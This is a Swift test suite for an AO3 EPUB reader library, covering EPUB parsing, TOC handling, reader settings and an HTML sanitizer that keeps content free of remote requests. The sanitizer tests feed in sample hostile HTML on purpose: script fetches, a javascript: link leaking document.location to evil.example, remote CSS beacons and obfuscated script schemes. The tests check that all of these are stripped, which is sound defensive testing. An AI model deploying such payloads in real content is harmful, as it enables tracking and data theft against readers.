import Testing
import Foundation
@testable import AO3Kit

/// Reader-side coverage: `EpubDocument` against synthetic EPUBs (both TOC flavours), the
/// pure `ReaderSession`/`ReaderSettings` logic, and `Store` reading-position persistence.
@Suite struct EpubReaderTests {

    // MARK: - EpubDocument

    @Test func parsesMetadataAndSpine() throws {
        for flavour in [EpubFlavour.nav, .ncx] {
            let url = try SyntheticEpub.make(flavour: flavour)
            defer { try? FileManager.default.removeItem(at: url) }
            let doc = try EpubDocument(url: url)

            #expect(doc.metadata.title == "Synthetic Work")
            #expect(doc.metadata.author == "Test Author")
            #expect(doc.metadata.language == "en")
            #expect(doc.opfDirectory == "OEBPS")
            #expect(doc.spine.count == 3)
            #expect(doc.sectionCount == 3)
            #expect(doc.spine.map(\.path) == ["OEBPS/ch1.xhtml", "OEBPS/ch2.xhtml", "OEBPS/ch3.xhtml"])
        }
    }

    @Test func parsesTOCForBothFlavours() throws {
        for flavour in [EpubFlavour.nav, .ncx] {
            let url = try SyntheticEpub.make(flavour: flavour)
            defer { try? FileManager.default.removeItem(at: url) }
            let doc = try EpubDocument(url: url)

            #expect(doc.toc.count == 3)
            #expect(doc.toc.map(\.title) == ["Chapter One", "Chapter Two", "Chapter Three"])
            #expect(doc.toc.map(\.spineIndex) == [0, 1, 2])
            #expect(doc.sectionTitles == ["Chapter One", "Chapter Two", "Chapter Three"])
        }
    }

    // MARK: - AO3-shaped EPUB: section folding, entity safety, generated-doc cleanliness

    @Test func foldsFrontMatterAndTitlePageIntoSections() throws {
        let url = try SyntheticEpub.makeAO3Like()
        defer { try? FileManager.default.removeItem(at: url) }
        let doc = try EpubDocument(url: url)

        #expect(doc.spine.count == 5)                                   // preface,title,ch1,ch2,after
        #expect(doc.sectionCount == 4)                                  // title page folded out
        #expect(doc.sectionTitles == ["Preface", "Chapter 1", "Chapter 2", "Afterword"])
        #expect(doc.sections.first?.spineIndices == [0, 1])             // title page absorbed into Preface
    }

    @Test func generatedChapterIsEntitySafeAndRemoteFree() throws {
        let url = try SyntheticEpub.makeAO3Like()
        defer { try? FileManager.default.removeItem(at: url) }
        let doc = try EpubDocument(url: url)

        // Chapter 1 has a `&nbsp;` — in the generated text/html it must not truncate the chapter
        // (the bug that left chapters partial when served as strict XHTML), and the remote <img>
        // must be gone (built from sanitized bodies → no off-disk references).
        let chapter = doc.chapterHTML(sectionIndex: 1, css: "body{}")
        #expect(chapter.contains("AFTER the entity"))
        #expect(!chapter.contains("evil.example"))
        #expect(chapter.contains("body{}"))                             // injected CSS present

        let whole = doc.wholeWorkHTML(css: "x{}")
        #expect(whole.contains("ao3-sec-0") && whole.contains("ao3-sec-3"))  // all units, anchored
        #expect(!whole.contains("evil.example"))
    }

    @Test func scrollDocHasReporterChapterDocDoesNot() throws {
        let url = try SyntheticEpub.makeAO3Like()
        defer { try? FileManager.default.removeItem(at: url) }
        let doc = try EpubDocument(url: url)
        // Scroll mode carries the one-way scroll reporter; chapter mode doesn't need it.
        #expect(doc.wholeWorkHTML(css: "x{}").contains("messageHandlers.reader"))
        #expect(!doc.chapterHTML(sectionIndex: 1, css: "x{}").contains("messageHandlers.reader"))
    }

    @Test func bodyHTMLIsStableWhenCached() throws {
        let url = try SyntheticEpub.makeAO3Like()
        defer { try? FileManager.default.removeItem(at: url) }
        let doc = try EpubDocument(url: url)
        let first = try doc.bodyHTML(forSpineIndex: 2)
        let second = try doc.bodyHTML(forSpineIndex: 2)   // served from cache
        #expect(first == second)
        #expect(first.contains("AFTER the entity"))
    }

    @Test func readsChapterHTML() throws {
        let url = try SyntheticEpub.make(flavour: .nav)
        defer { try? FileManager.default.removeItem(at: url) }
        let doc = try EpubDocument(url: url)
        #expect(try doc.html(forSpineIndex: 0).contains("Chapter One"))
        #expect(try doc.html(forSpineIndex: 2).contains("Body text Three"))
    }

    @Test func extractsToDiskForFileLoading() throws {
        let url = try SyntheticEpub.make(flavour: .ncx)
        defer { try? FileManager.default.removeItem(at: url) }
        let doc = try EpubDocument(url: url)

        let dir = FileManager.default.temporaryDirectory
            .appendingPathComponent("extract-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        try doc.extractAll(to: dir)

        let ch1 = doc.fileURL(forSpineIndex: 0, extractedTo: dir)
        #expect(ch1.lastPathComponent == "ch1.xhtml")
        #expect(FileManager.default.fileExists(atPath: ch1.path))
        let extracted = try String(contentsOf: ch1, encoding: .utf8)
        #expect(extracted.contains("Chapter One"))
    }

    @Test func rejectsNonEpub() throws {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("not.epub")
        try Data("plain text, not a zip".utf8).write(to: url)
        defer { try? FileManager.default.removeItem(at: url) }
        #expect(throws: (any Error).self) { try EpubDocument(url: url) }
    }

    // MARK: - Sanitizer (the no-remote-requests invariant, enforced in the DOM)

    @Test func sanitizerStripsRemoteRefsKeepsLocal() {
        let clean = EpubSanitizer.sanitize("""
            <html><body>
              <img src="https://evil.example/track.png"/>
              <img src="images/local.png"/>
              <script>fetch('https://evil.example')</script>
              <a href="https://evil.example/leak">x</a>
              <a href="ch2.xhtml#top">local</a>
              <p onload="fetch('https://evil.example')">hi</p>
            </body></html>
            """)
        #expect(!clean.contains("evil.example"))   // every remote ref gone
        #expect(!clean.lowercased().contains("<script"))
        #expect(!clean.lowercased().contains("onload"))
        #expect(clean.contains("images/local.png"))  // local resources preserved
        #expect(clean.contains("ch2.xhtml#top"))      // local link preserved
    }

    @Test func isRemoteClassification() {
        #expect(EpubSanitizer.isRemote("https://x.com/a.png"))
        #expect(EpubSanitizer.isRemote("http://x.com/a.png"))
        #expect(EpubSanitizer.isRemote("//cdn.x.com/a.png"))
        #expect(!EpubSanitizer.isRemote("images/a.png"))
        #expect(!EpubSanitizer.isRemote("../Styles/main.css"))
        #expect(!EpubSanitizer.isRemote("#anchor"))
        #expect(!EpubSanitizer.isRemote(""))
    }

    @Test func sanitizerStripsRemoteCSS() {
        // Zero-click subresource loads: a remote `url()` in a <style> block or an inline style
        // attribute fetches on render. Neither survives.
        let clean = EpubSanitizer.sanitize("""
            <html><head>
              <style>@import url("https://evil.example/beacon.css"); body{background:url(https://evil.example/bg.png)}</style>
            </head><body>
              <p style="background-image:url(https://evil.example/track.png)">a</p>
              <p style="background:url(//evil.example/track2.png)">b</p>
              <p style="background:url(\\68ttps://evil.example/esc.png)">e</p>
              <p style="color:red">c</p>
              <div style="background:url(images/local.png)">d</div>
            </body></html>
            """)
        #expect(!clean.contains("evil.example"))          // every remote CSS ref gone (incl. escaped)
        #expect(!clean.lowercased().contains("<style"))    // style element dropped wholesale
        #expect(!clean.lowercased().contains("@import"))
        #expect(clean.contains("color:red"))               // benign inline style kept
        // Any url()-bearing inline style is dropped wholesale — we can't trust a remote/local
        // distinction once CSS escapes are in play — so even the local one goes.
        #expect(!clean.contains("images/local.png"))
        #expect(clean.contains("<div"))                    // …but the element itself remains
    }

    @Test func sanitizerStripsScriptSchemeLinks() {
        let clean = EpubSanitizer.sanitize("""
            <html><body>
              <a href="javascript:fetch('https://evil.example/'+document.location)">x</a>
              <a href="VBScript:msgbox(1)">y</a>
              <a href="ch2.xhtml#top">local</a>
              <form action="javascript:steal()"><input/></form>
            </body></html>
            """)
        #expect(!clean.lowercased().contains("javascript:"))
        #expect(!clean.lowercased().contains("vbscript:"))
        #expect(clean.contains("ch2.xhtml#top"))           // ordinary local link preserved
    }

    @Test func schemeAndCSSClassification() {
        #expect(EpubSanitizer.hasDangerousScheme("javascript:alert(1)"))
        #expect(EpubSanitizer.hasDangerousScheme("  JavaScript:alert(1)"))
        #expect(EpubSanitizer.hasDangerousScheme("vbscript:x"))
        #expect(EpubSanitizer.hasDangerousScheme("java\tscript:x"))   // tab obfuscation
        #expect(EpubSanitizer.hasDangerousScheme("java\nscript:x"))   // newline obfuscation
        #expect(!EpubSanitizer.hasDangerousScheme("https://x/a"))
        #expect(!EpubSanitizer.hasDangerousScheme("ch1.xhtml"))
        // Any url()/@import-bearing style is dropped — remote, protocol-relative, escaped, OR local.
        #expect(EpubSanitizer.styleMayLoadResource("background:url(https://x/a.png)"))
        #expect(EpubSanitizer.styleMayLoadResource("background:url(//x/a.png)"))
        #expect(EpubSanitizer.styleMayLoadResource("background:url(\\68ttps://x/a.png)"))
        #expect(EpubSanitizer.styleMayLoadResource("@import 'x.css'"))
        #expect(EpubSanitizer.styleMayLoadResource("background:url(images/a.png)"))
        #expect(!EpubSanitizer.styleMayLoadResource("color:red"))
        #expect(!EpubSanitizer.styleMayLoadResource(""))
    }

    @Test func extractedHTMLOnDiskIsSanitized() throws {
        let url = try SyntheticEpub.make(flavour: .nav, remoteRefs: true)
        defer { try? FileManager.default.removeItem(at: url) }
        let doc = try EpubDocument(url: url)

        let dir = FileManager.default.temporaryDirectory
            .appendingPathComponent("clean-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        try doc.extractAll(to: dir)   // sanitizes by default

        let onDisk = try String(contentsOf: doc.fileURL(forSpineIndex: 0, extractedTo: dir), encoding: .utf8)
        #expect(!onDisk.contains("evil.example"))            // remote img/script/link gone
        #expect(!onDisk.lowercased().contains("<script"))
        #expect(onDisk.contains("cover.png"))                // local img src kept
        #expect(onDisk.contains("Chapter One"))              // real content untouched
    }

    // MARK: - Path helpers

    @Test func resolvesRelativePaths() {
        #expect(EpubDocument.resolvePath(base: "OEBPS", href: "ch1.xhtml") == "OEBPS/ch1.xhtml")
        #expect(EpubDocument.resolvePath(base: "OEBPS/text", href: "../images/x.png") == "OEBPS/images/x.png")
        #expect(EpubDocument.resolvePath(base: "", href: "content.opf") == "content.opf")
        #expect(EpubDocument.resolvePath(base: "OEBPS", href: "./a/b.xhtml") == "OEBPS/a/b.xhtml")
        #expect(EpubDocument.directory(of: "OEBPS/content.opf") == "OEBPS")
        #expect(EpubDocument.directory(of: "content.opf") == "")
    }

    // MARK: - ReaderSession

    @Test func sessionNavigationRespectsBounds() {
        var s = ReaderSession(unitCount: 3)
        #expect(s.index == 0)
        #expect(!s.canGoPrevious)
        #expect(s.canGoNext)

        // Mutating calls are extracted from #expect (the macro captures by immutable copy).
        let advanced1 = s.goNext(); #expect(advanced1)
        let advanced2 = s.goNext(); #expect(advanced2)
        #expect(s.index == 2)
        #expect(!s.canGoNext)
        let pastEnd = s.goNext(); #expect(!pastEnd)   // clamped at the end
        #expect(s.index == 2)

        let back = s.goPrevious(); #expect(back)
        #expect(s.index == 1)
    }

    @Test func sessionJumpClampsAndProgress() {
        var s = ReaderSession(unitCount: 5)
        s.jump(to: 99)
        #expect(s.index == 4)
        #expect(s.progress == 1.0)
        s.jump(to: -3)
        #expect(s.index == 0)
        #expect(s.progress == 0.0)
        s.jump(to: 2)
        #expect(s.progress == 0.5)
    }

    @Test func emptySessionIsSafe() {
        var s = ReaderSession(unitCount: 0)
        #expect(s.index == 0)
        #expect(!s.canGoNext && !s.canGoPrevious)
        let moved = s.goNext(); #expect(!moved)
        #expect(s.progress == 0)
    }

    @Test func initClampsStartIndex() {
        #expect(ReaderSession(unitCount: 3, index: 10).index == 2)
        #expect(ReaderSession(unitCount: 3, index: -1).index == 0)
    }

    // MARK: - ReaderSettings

    @Test func settingsClampAndEncodeCSS() {
        var s = ReaderSettings(theme: .sepia, fontScale: 5.0, lineSpacing: 0.1, fontFamily: "Palatino")
        #expect(s.fontScale == ReaderSettings.fontScaleRange.upperBound)
        #expect(s.lineSpacing == ReaderSettings.lineSpacingRange.lowerBound)

        let css = s.injectedCSS
        #expect(css.contains("theme: sepia"))
        #expect(css.contains("Palatino"))
        #expect(css.contains("200%"))               // 2.0 scale → 200%
        #expect(css.contains("#f4ecd8"))            // sepia background
        #expect(css.contains("section.ao3-chapter"))

        #expect(css.contains("\"Palatino\", Georgia"))   // named serif face gets serif fallback
        #expect(css.contains("serif;"))

        s.fontScale = 1.0; s.normalize()
        #expect(s.injectedCSS.contains("100%"))
    }

    @Test func ao3FontEmitsArchiveSansStack() {
        #expect(ReaderSettings.availableFonts.contains(ReaderSettings.ao3FontName))
        let css = ReaderSettings(fontFamily: ReaderSettings.ao3FontName).injectedCSS
        #expect(css.contains("'Lucida Grande'"))
        #expect(css.contains("sans-serif;"))
        #expect(!css.contains("\"AO3\""))                 // never emit the placeholder name as a face
    }

    @Test func settingsRoundTripCodable() throws {
        let original = ReaderSettings(theme: .black, fontScale: 1.4, lineSpacing: 1.8,
                                      fontFamily: "Iowan", layout: .chapter)
        let data = try JSONEncoder().encode(original)
        let decoded = try JSONDecoder().decode(ReaderSettings.self, from: data)
        #expect(decoded == original)
        #expect(decoded.injectedCSS.contains("layout: chapter"))
    }

    // MARK: - Store reading position

    @Test func readingPositionPersistsAndResumes() throws {
        let store = try Store(inMemory: true)
        // reading_position has a FK to work(id), so the work must exist first.
        try store.upsertWork(WorkBlurb(workID: 42, title: "W", author: "A"))
        #expect(try store.readingPosition(workID: 42) == nil)

        try store.saveReadingPosition(workID: 42, spineIndex: 3, progress: 0.6)
        let pos = try #require(try store.readingPosition(workID: 42))
        #expect(pos.spineIndex == 3)
        #expect(pos.progress == 0.6)

        try store.saveReadingPosition(workID: 42, spineIndex: 7, progress: 0.9)  // upsert
        #expect(try store.readingPosition(workID: 42)?.spineIndex == 7)
        #expect(try store.count("reading_position") == 1)
    }
}
